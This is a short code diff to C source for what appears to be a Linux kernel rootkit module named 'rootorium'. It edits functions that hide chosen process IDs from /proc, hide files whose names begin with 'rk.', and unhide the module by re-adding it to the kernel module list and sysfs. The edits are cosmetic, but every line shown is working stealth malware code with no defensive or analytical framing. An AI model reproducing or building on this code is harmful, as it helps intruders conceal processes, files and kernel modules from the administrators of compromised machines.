@@ -67,7 +67,7 @@ static int proc_filldir_new(void *buf, const char *name, int namelen,
 {
     int i;
 
-    for(i=0; i < current_pid; i++)
+    for(i = 0; i < current_pid; i++)
     {
         if(!strcmp(name, pids_to_hide[i]))
             return 0;
@@ -89,7 +89,7 @@ static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
 static int fs_filldir_new(void *buf, const char *name, int namelen,
     loff_t offset, u64 ino, unsigned d_type)
 {
-    if(hide_files && (!strncmp(name, "rk.", 3) || !strncmp(name, "10-rt.", 6)))
+    if(hide_files && (!strncmp(name, "rk.", 3)))
         return 0;
 
     return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
@@ -118,12 +118,14 @@ void module_hide(void)
 
 static void module_show(void)
 {
+    int ret;
+
     if(!hide_module)
         return;
 
     list_add(&THIS_MODULE->list, module_previous);
-    if(kobject_add(&THIS_MODULE->mkobj.kobj,
-        THIS_MODULE->mkobj.kobj.parent, "rootorium"));
+    ret = kobject_add(&THIS_MODULE->mkobj.kobj,
+        THIS_MODULE->mkobj.kobj.parent, "rootorium");
     hide_module = !hide_module;
 }
 
